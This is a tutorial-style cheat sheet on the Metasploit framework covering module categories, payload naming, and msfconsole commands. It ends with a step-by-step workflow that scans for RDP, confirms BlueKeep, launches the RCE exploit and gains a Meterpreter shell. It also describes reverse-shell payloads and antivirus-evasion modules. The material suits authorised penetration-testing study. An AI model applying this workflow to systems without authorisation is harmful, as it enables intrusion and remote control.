# Metasploit

## List of modules and categories

In _**Kali Linux**_, this can be found from the: `/usr/share/metasploit-framework/modules` directory.

It can be found on a Linux system with the following command:&#x20;

```bash
$ sudo find / -path '*metasploit-framework*modules' 2>/dev/null 
```

1. _**Auxiliary**_&#x20;

> Any supporting module, such as scanners, crawlers and fuzzers, can be found here.

2. _**Encoders**_

> Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.

3. _**Evasion**_

> While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, `evasion` modules will try that, with more or less success.

4. _**Exploits**_

> A piece of code that uses a vulnerability present on the target system

5. _**NOPs**_

> NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with `0x90`, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.

6. _**Payloads**_

> Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be; getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report.

There will be four different directories under payloads: `adapters`, `singles`, `stagers` and `stages`.

a) `Adapters`: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.<br>

b) `Singles`: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.

c) `Stagers`: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.

d) `Stages`: Downloaded by the stager. This will allow you to use larger sized payloads.

* Refer to the _**Naming conventions**_ section below for more information

7. _**Post**_

> Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

### View sub-categories under each main module

To list all the sub-categories under each main module in a neat pattern, run the following command from the folder directory.&#x20;

Eg. to view all the options provided under `Exploits`,  simply run the following command from the `/usr/share/metasploit-framework/modules/exploits` directory:

```bash
/usr/share/metasploit-framework/modules/exploits$ tree -L 1 
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
...
```

## Naming conventions

### General naming convention

* Refer to _**Msfvenom**_ section for more info.

### How to identify `single` and `staged` payloads?

Metasploit has a subtle way to help you identify `single` (also called _inline_) payloads and `staged` payloads.

* `windows/x64/shell_reverse_tcp`  (inline)
* `windows/x64/shell/reverse_tcp` (staged)

Both are reverse Windows shells. The former is an _inline_ (or `single`) payload, as indicated by the underscore character (`_`) between the words **shell** and **reverse**. While the latter is a `staged` payload, as indicated by the slash character (`/`) between the same two words.

## msfconsole

_msfconsole_ is the main interface to the Metasploit framework.

### Commands overview

1. _**Common shell commands**_

&#x20;        a) `ls`

&#x20;        b) `ping`&#x20;

&#x20;        c) `clear`

&#x20;        d) `exit`

2. `help`&#x20;

```sh
msf6> help search
Usage: search [<options>] [<keywords>:<value>]

...

OPTIONS:

    -h, --help                      Help banner
   ...
   
Keywords:
  adapter          :  Modules with a matching adapter reference name
  aka              :  Modules with a matching AKA (also-known-as) name
  author           :  Modules written by this author
  arch             :  Modules affecting this architecture
  bid              :  Modules with a matching Bugtraq ID
  osvdb            :  Modules with a matching OSVDB ID
  cve              :  Modules with a matching CVE ID
...
```

3. `history`
4. `search`

Search by CVE numbers, exploit names (eternalblue, heartbleed, etc.), or target system. The search function can be directed using keywords such as type and platform.

```bash
msf6 > search type:auxiliary telnet
```

Eg. Search for reverse shell payload for Linux

```sh
msf6> search type:payload platform:linux reverse
```

5. `use`

Eg. `windows/ssh/freeshd_authbypass` module

```bash
msf6 > use exploit/windows/ssh/freesshd_authbypass
```

6. `show`

a) `show options`

b) `show paylods`

c) `show targets`

```bash
msf6 exploit(windows/ssh/freesshd_authbypass) > show options

Module options (exploit/windows/ssh/freesshd_authbypass):

   Name       Current Setting                    Required  Description
   ----       ---------------                    --------  -----------
   RHOSTS                                        yes       The target host(s), see https://docs.metasploit.com/docs/u
                                                           sing-metasploit/basics/using-metasploit.html
   RPORT      22                                 yes       The target port (TCP)
   
   ...

```

```bash
msf6 exploit(windows/ssh/freesshd_authbypass) > show payloads
...
```

7. `set`

a) `set payload`

b) `set target`

From the same `windows/ssh/freeshd_authbypass` module above:

```bash
# RHOSTS option required as shown from "show options" command above
msf6 exploit(windows/ssh/freesshd_authbypass) > set rhosts 10.10.10.22

msf6 exploit(windows/ssh/freesshd_authbypass) > show options

Module options (exploit/windows/ssh/freesshd_authbypass):

   Name       Current Setting                    Required  Description
   ----       ---------------                    --------  -----------
   RHOSTS     10.10.10.22                        yes       The target host(s), see https://docs.metasploit.com/docs/u
                                                           sing-metasploit/basics/using-metasploit.html
   RPORT      22                                 yes       The target port (TCP)
   
   ...
   
msf6 exploit(windows/ssh/freesshd_authbypass) > show payloads
...
msf6 exploit(windows/ssh/freesshd_authbypass) > set payload <index_or_name_of_payload>
```

Use the `unset` command to remove option values:

```bash
msf6 exploit(windows/ssh/freesshd_authbypass) > unset rhosts
msf6 exploit(windows/ssh/freesshd_authbypass) > unset all # remove all options
```

8. `info`

```bash
msf6 > info exploit/windows/ssh/freesshd_authbypass
...

# OR from within the module
msf6 exploit(windows/ssh/freesshd_authbypass) > info
       Name: Freesshd Authentication Bypass
     Module: exploit/windows/ssh/freesshd_authbypass
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2010-08-11

...
```

_**Global option values**_&#x20;

Use the `setg` and `unsetg` options.



9. `exploit`/`run`/`check`

`-z` flag to the `exploit` command will run the exploit and background the session as soon as it opens

The `exploit` and `run` command can be executed from the module after all relevant module parameters/options have been set with the `set` command (see above). The `exploit` and `run` command does the same thing.

```bash
msf6 exploit(windows/ssh/freesshd_authbypass) > exploit
```

Some modules supports the `check` command. This command will check if the target system is vulnerable without exploiting it.

10. `background`

The `background` command can be used to background the session prompt and go back to the _msfconsole_ prompt.

11. `sessions`

The `sessions` command can be used from the _msfconsole_ prompt or any context to see the existing sessions.

```bash
msf6 exploit(windows/ssh/freesshd_authbypass) > sessions

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1   ...   ...                      ...                           ...
```

The `sessions -i` command can be used to interact with a session:

```bash
msf6 > session 
Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1   ...   ...                      ...                           ...

msf6 > session -i 1
```

11. `back`&#x20;

```bash
msf6 exploit(windows/ssh/freesshd_authbypass) > back
msf6 > 
```

### Typical workflow

1. Identify service that is running

_**Eg**_. `RDP` service on port **3389**

```bash
$ sudo nmap ...

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
...
```

2. Search (`search` command) for auxiliary module (eg. scanner) and select using the `use` command

```bash
msf6 > search type:auxiliary scanner/rdp
0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep  2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
...

msf6 > use 0
```

3. View information about the module using the `info` or `show options` command: identify required parameters and `set` the values: rhosts, etc.

```bash
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > info
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set rhosts ...
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set ...
```

4. Run auxiliary module to discover if target system is vulnerable (`run`/`exploit` command)

Suppose the system is vulnerable to the particular vulnerability

```bash
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
... SYSTEM IS VULNERABLE TO ... bluekeep ....
```

5. Search (`search` command) for related exploit and select using the `use` command

```bash
msf6 > search type:exploit bluekeep
 0  exploit/windows/rdp/cve_2019_0708_bluekeep_rce    2019-05-14 ...
 
msf6 > use 0
```

6. Read information about the exploit using the `info`or`show options` command: identify required parameters and set the values

```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > info
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set rhosts ...
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set ...
```

7. Search for payload, read information about it, and set the payload

Alternatively, use the default payload selected

```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > search payloads
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set payload 0 # eg. payload index 0
```

8. View the targets and select the relevant one

```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target ...
```

9. Run exploit

```bash
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit
```

10. Gain Meterpreter

```bash
meterpreter > pwd
meterpreter > ls 
meterpreter > shell
...
```

### Other useful commands

1. `set ReverseListenerBindAddress`&#x20;

* With this option, we can specify the address to which we want the reverse shell connection to be tunneled through

Eg.&#x20;

```sh
# configure reverse shell listener on localhost address 127.0.0.1
set ReverseListenerBindAddress 127.0.0.1
```

This can be useful when we tunnel an exploit via a jump/intermediary server listening on _127.0.0.1_.&#x20;
